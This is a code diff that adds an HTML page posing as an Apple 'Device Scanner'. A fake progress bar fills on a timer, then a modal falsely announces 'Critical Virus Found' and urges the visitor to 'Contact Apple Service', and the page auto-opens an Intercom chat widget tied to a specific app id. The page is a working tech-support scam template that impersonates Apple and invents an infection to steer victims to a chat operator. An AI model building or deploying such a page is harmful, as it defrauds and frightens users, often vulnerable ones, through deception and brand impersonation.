@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Scanner</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .scan-text {
+            font-family: 'San Francisco', Arial, sans-serif;
+            margin-bottom: 10px;
+        }
+
+        .scan-button, .contact-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px;
+            background-color: black;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .or-text {
+            font-weight: bold;
+            font-family: 'San Francisco', Arial, sans-serif;
+            margin: 5px 0;
+        }
+
+        .loading-bar {
+            width: 100%;
+            max-width: 300px; /* Set maximum width for the loading bar */
+            height: 10px;
+            background-color: lightgray;
+            margin-bottom: 20px; /* Space between loading bar and button */
+        }
+
+        .loading-progress {
+            height: 100%;
+            background-color: blue;
+            width: 0%; /* Start with 0% width for dummy loading */
+            transition: width 0.5s ease-in-out; /* Smooth transition */
+        }
+
+        .error-prompt {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .error-message {
+            color: red;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            border-radius: 20px;
+            text-align: center;
+        }
+        img {
+            width: 400px;
+            height: 300px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="apple.gif" alt="Logo">
+        </div>
+        <div class="scan-text">Please Wait while we connect with apple server</div>
+        <div class="button-container">
+            <div class="loading-bar">
+                <div class="loading-progress"></div>
+            </div>
+            <button class="scan-button">CONNECTING</button>
+        </div>
+        <div class="error-prompt">
+            <p class="error-message"></p>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <img src="error.jpg" alt="Logo" style="border-radius: 50%; width: 100px; height: 100px;">
+            <h2 style="margin-top: 20px;color: red;">Critical Virus Found</h2>
+            <p style="font-weight: bold; font-family: 'San Francisco', Arial, sans-serif;">Your apple device has severe virus infection</p>
+            <button id="modalButton" style="border-radius: 20px; background-color: #7E499D; color: white; padding: 10px 20px; border: none; cursor: pointer;">Contact Apple Service</button>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript to incrementally fill the loading bar and show Intercom chat widget
+        document.addEventListener('DOMContentLoaded', function() {
+            var progress = 0;
+            var loadingProgress = document.querySelector('.loading-progress');
+            var interval;
+
+            function updateLoadingBar() {
+                if (progress < 100) {
+                    progress += 10; // Increment by 10%
+                    loadingProgress.style.width = progress + '%';
+                } else {
+                    clearInterval(interval); // Stop when reaching 100%
+                    loadIntercom(); // Load Intercom chat widget
+                }
+            }
+
+            function loadIntercom() {
+                window.intercomSettings = {
+                    api_base: "https://api-iam.intercom.io",
+                    app_id: "qoqim8zv",
+                };
+
+                (function(){
+                    var w = window;
+                    var ic = w.Intercom;
+                    if (typeof ic === "function") {
+                        ic('reattach_activator');
+                        ic('update', w.intercomSettings);
+                        ic('show'); // Opens the Intercom chat widget
+                    } else {
+                        var d = document;
+                        var i = function(){ i.c(arguments); };
+                        i.q = [];
+                        i.c = function(args){ i.q.push(args); };
+                        w.Intercom = i;
+                        var l = function(){
+                            var s = d.createElement('script');
+                            s.type = 'text/javascript';
+                            s.async = true;
+                            s.src = 'https://widget.intercom.io/widget/qoqim8zv';
+                            var x = d.getElementsByTagName('script')[0];
+                            x.parentNode.insertBefore(s, x);
+                            s.onload = function() {
+                                // Ensure the widget opens only after the script is fully loaded
+                                if (typeof w.Intercom === "function") {
+                                    w.Intercom('show');
+                                }
+                            };
+                        };
+                        if (document.readyState === 'complete') {
+                            l();
+                        } else if (w.attachEvent) {
+                            w.attachEvent('onload', l);
+                        } else {
+                            w.addEventListener('load', l, false);
+                        }
+                    }
+                })();
+            }
+
+            interval = setInterval(updateLoadingBar, 500); // Update every 500ms
+        });
+    </script>
+</body>
+</html>
